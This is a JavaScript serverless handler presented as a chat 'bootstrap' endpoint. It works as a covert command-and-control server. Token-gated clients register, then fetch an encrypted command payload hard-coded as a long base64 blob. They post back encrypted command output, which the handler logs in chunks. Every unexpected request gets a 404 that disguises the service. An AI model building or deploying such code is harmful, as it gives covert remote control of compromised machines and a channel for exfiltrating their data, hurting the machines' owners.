import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '16';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) {
      console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    }
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
